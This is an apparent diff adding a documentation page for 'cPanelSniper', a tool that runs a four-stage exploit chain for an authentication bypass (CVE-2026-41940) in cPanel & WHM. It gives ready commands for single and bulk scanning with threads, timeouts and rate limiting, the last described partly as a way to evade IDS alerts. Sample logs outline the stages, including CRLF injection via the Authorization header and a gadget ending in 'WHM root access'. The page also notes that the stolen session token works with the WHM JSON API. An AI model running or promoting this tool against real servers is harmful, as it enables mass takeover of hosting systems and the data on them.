@@ -1,0 +1,161 @@
+---
+title: "Scanning cPanel & WHM Targets for CVE-2026-41940"
+description: "Run single-target and bulk scans against cPanel & WHM with cPanelSniper. Configure threads, timeouts, and JSON output for large-scale assessments."
+---
+
+cPanelSniper runs a 4-stage exploit chain against each target to confirm whether CVE-2026-41940 is exploitable. You supply one target with `-u`, a file of targets with `-l`, or pipe URLs in from stdin. Every confirmed bypass is written to the results summary and, optionally, to a JSON file.
+
+<Warning>
+  Use cPanelSniper only against systems you are authorized to test. Unauthorized access to computer systems is illegal. Always obtain written permission before scanning.
+</Warning>
+
+## Single target scan
+
+Point `-u` at a WHM port (typically 2087 for HTTPS or 2086 for HTTP). The tool auto-discovers the canonical hostname via a Stage 0 redirect before running the exploit chain.
+
+```bash
+python3 cPanelSniper.py -u https://target.com:2087
+```
+
+To override the auto-discovered canonical hostname (useful when DNS does not resolve correctly from your machine), pass `--hostname`:
+
+```bash
+python3 cPanelSniper.py -u https://target.com:2087 --hostname srv01.target.com
+```
+
+## Bulk scan from file
+
+Pass a newline-separated list of URLs with `-l`. Each target is scanned concurrently up to the thread limit.
+
+```bash
+python3 cPanelSniper.py -l targets.txt -t 20 -o results.json
+```
+
+The targets file should contain one URL per line:
+
+```text
+https://target1.com:2087
+https://target2.com:2087
+https://198.51.100.10:2087
+```
+
+<Note>
+  Post-exploit `--action` flags only execute when a single target is provided via `-u`. They are skipped silently during bulk scans.
+</Note>
+
+## Thread configuration
+
+`-t` / `--threads` controls how many targets are scanned concurrently. The default is 10. Raise it for large target lists; lower it if you are hitting rate limits on the network.
+
+```bash
+# 30 concurrent threads
+python3 cPanelSniper.py -l targets.txt -t 30 -o results.json
+
+# Conservative single-thread mode
+python3 cPanelSniper.py -l targets.txt -t 1
+```
+
+## Timeout
+
+`--timeout` sets the per-request timeout in seconds. The default is 15. Increase it for slow hosts or intercontinental targets.
+
+```bash
+python3 cPanelSniper.py -l targets.txt --timeout 30 -o results.json
+```
+
+## Rate limiting
+
+`--rate-limit` inserts a delay (in seconds) between each target dispatch. Use it to stay within rate-limit policies on bug bounty programs or to avoid triggering IDS alerts during large scans.
+
+```bash
+# 0.5-second delay between targets
+python3 cPanelSniper.py -l targets.txt -t 10 --rate-limit 0.5
+```
+
+## JSON output
+
+`-o` / `--output` saves all confirmed findings to a JSON file. The file is written after the scan completes. The format includes scanner metadata, the CVE identifier, and a `findings` array.
+
+```bash
+python3 cPanelSniper.py -l targets.txt -t 20 -o results.json
+```
+
+Example output structure:
+
+```json
+{
+  "scanner": "cPanelSniper v2.0",
+  "cve": "CVE-2026-41940",
+  "timestamp": "2026-04-28T14:46:22.000000",
+  "findings": [
+    {
+      "severity": "CRIT",
+      "title": "CVE-2026-41940 — cPanel & WHM Authentication Bypass",
+      "target": "https://target.com:2087",
+      "canonical": "srv01.target.com",
+      "token": "/cpsess8493537756",
+      "version": "11.130.0.6",
+      "api_url": "https://target.com:2087/cpsess8493537756/json-api/version",
+      "cve": "CVE-2026-41940",
+      "cvss": "10.0",
+      "timestamp": "2026-04-28T14:46:26.000000"
+    }
+  ]
+}
+```
+
+## Understanding stage output
+
+Each target produces timestamped log lines as the 4-stage chain executes:
+
+```text
+14:46:22 [SCAN] Starting 4-stage exploit chain... https://target.com:2087
+14:46:23 [INFO] Canonical hostname discovered: srv01.target.com
+14:46:23 [STEP] Stage 1/4 — Minting preauth session...
+14:46:23 [  OK] Stage1: preauth session = :QFB4o8XENBqlr6U1...
+14:46:23 [STEP] Stage 2/4 — CRLF injection via Authorization header...
+14:46:24 [  OK] Stage2: HTTP 307 → token=/cpsess8493537756
+14:46:24 [STEP] Stage 3/4 — Firing do_token_denied gadget (raw→cache)...
+14:46:25 [  OK] Stage3: HTTP 401 — do_token_denied gadget fired
+14:46:25 [STEP] Stage 4/4 — Verifying WHM root access...
+14:46:26 [PWND] CVE-2026-41940 CONFIRMED — WHM root access!
+14:46:26 [PWND]   Token    : /cpsess8493537756
+14:46:26 [PWND]   Version  : 11.130.0.6
+14:46:26 [PWND]   API URL  : https://target.com:2087/cpsess8493537756/json-api/version
+```
+
+| Log tag | Meaning |
+|---------|---------|
+| `[SCAN]` | Scan started for this target |
+| `[INFO]` | Informational — canonical hostname discovered |
+| `[STEP]` | A stage of the exploit chain is running |
+| `[  OK]` | The stage completed successfully |
+| `[PWND]` | Auth bypass confirmed — WHM root access obtained |
+| `[WARN]` | Unexpected but non-fatal condition |
+| `[ ERR]` | Stage failed; target is likely patched or unreachable |
+| `[SKIP]` | Target skipped (not cPanel, or already scanned) |
+| `[ API]` | Post-exploit API call in progress |
+
+## Results summary
+
+After all targets are processed, cPanelSniper prints a summary block:
+
+```text
+══════════════════════════════════════════════════════════════════════
+  cPanelSniper — Scan Complete
+  Time: 5.8s  ·  Targets: 1
+
+  ⚡ 1 VULNERABLE TARGET(S)
+
+  Target   : https://target.com:2087
+  Version  : 11.130.0.6
+  Token    : /cpsess8493537756
+  API URL  : https://target.com:2087/cpsess8493537756/json-api/version
+══════════════════════════════════════════════════════════════════════
+```
+
+The `Token` value is the authenticated WHM session path returned in Stage 2. It is valid for the duration of the server session and can be used directly with the WHM JSON API.
+
+<Tip>
+  To suppress ANSI color codes (for example, when logging output to a file), add `--no-color` to any command.
+</Tip>
